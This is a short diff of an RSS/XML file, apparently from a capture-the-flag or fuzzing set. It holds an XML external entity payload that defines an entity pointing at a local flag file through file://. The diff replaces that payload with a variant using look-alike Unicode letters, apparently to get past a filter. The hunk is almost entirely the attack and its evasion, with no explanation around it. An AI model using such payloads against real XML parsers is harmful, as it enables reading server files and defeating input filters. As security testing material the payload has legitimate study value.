@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///flag_399959b2b76194a81df71b4f73593a47" >]><rss version="2.0"
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "ⓕile:///ⓕlag_399959b2b76194a81df71b4f73593a47" >]><rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
 	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
 	xmlns:dc="http://purl.org/dc/elements/1.1/"
